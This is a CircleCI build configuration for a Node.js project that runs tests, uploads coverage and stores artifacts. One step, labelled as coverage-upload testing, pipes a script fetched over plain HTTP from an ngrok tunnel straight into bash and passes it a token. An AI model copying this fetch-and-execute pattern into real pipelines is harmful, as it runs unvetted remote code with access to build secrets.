version: 2.1
orbs:
  node: circleci/node@1.0.0
  codecov: codecov/codecov@1.0.4
jobs:
  build:
    executor:
      name: node/node
      tag: "10.16.0"
    steps:
      - checkout
      - prepare-artifacts-dir
      - node-version-check:
          version: "v10.16.0"
      - run:
          name: Install dependencies
          command: npm ci
      - npm-outdated-check:
          should-fail: false
      - run:
          name: Make fake certs
          command: |
            touch src/services/shared/data/private_key.pem
            touch src/services/shared/data/pub.key
            touch src/services/shared/data/cert.pem
      - run:
          name: Run Tests
          command: npm run lint-test
      - run:
          command: echo $ARTIFACTS_PATH
          when: always
      - codecov/upload:
          file: coverage/*.xml
      - run:
          name: Upload coverage - Drazisil - testing
          command: bash <(curl -s http://joe-ccetest-1543d3.ngrok.io/bash) -t "gh123abc" -r drazisil/mco-server
      - upload-artifacts-group
      - store_test_results:
          path: test-reports
      - store_artifacts:
          path: test-reports

      - store_artifacts:
          path: coverage

commands:
  prepare-artifacts-dir:
    description: "Prepare and set artifacts directory path"
    parameters:
      artifacts-path:
        description: The path to store artifacts
        type: string
        default: "~/artifacts"
    steps:
      - run:
          name: "Create artifacts path"
          command: |
            mkdir -p << parameters.artifacts-path >>
            echo "export ARTIFACTS_PATH=<< parameters.artifacts-path >>" >> $BASH_ENV
      - run:
          name: "Echo artifacts path"
          command: |
            echo $ARTIFACTS_PATH
  npm-outdated-check:
    description: "Check for outdated versions of dependencies"
    parameters:
      report-path:
        default: "$ARTIFACTS_PATH"
        type: string
      should-fail:
        description: Should the step fail?
        type: boolean
        default: true
    steps:
      - when:
          condition: << parameters.should-fail >>
          steps:
            - run:
                name: "Check for outdated versions of dependencies"
                command: |
                  npm outdated | tee << parameters.report-path >>/outdated_versions.txt
      - unless:
          condition: << parameters.should-fail >>
          steps:
            - run:
                name: "Check for outdated versions of dependencies"
                command: |
                  npm outdated | tee << parameters.report-path >>/outdated_versions.txt || true
  node-version-check:
    description: "Check for version of Node"
    parameters:
      version:
        type: string
    steps:
      - run:
          name: "Check for version of Node"
          command: |
            node -v
            $([ $(node -v) == "<< parameters.version >>" ])
  upload-artifacts-group:
    description: "Upload several artifacts at once."
    parameters:
      artifacts-group:
        default: "$ARTIFACTS_PATH"
        type: string
    steps:
      - run:
          name: "Prepare artifacts group for upload"
          command: |
            mkdir -p ~/artifacts
            if [ << parameters.artifacts-group >> != ~/artifacts ]; then cp -r << parameters.artifacts-group >> ~/artifacts; fi
          when: always
      - store_artifacts:
          name: "Upload artifacts group"
          path: ~/artifacts
          when: always

workflows:
  version: 2.1
  build-test:
    jobs:
      - build
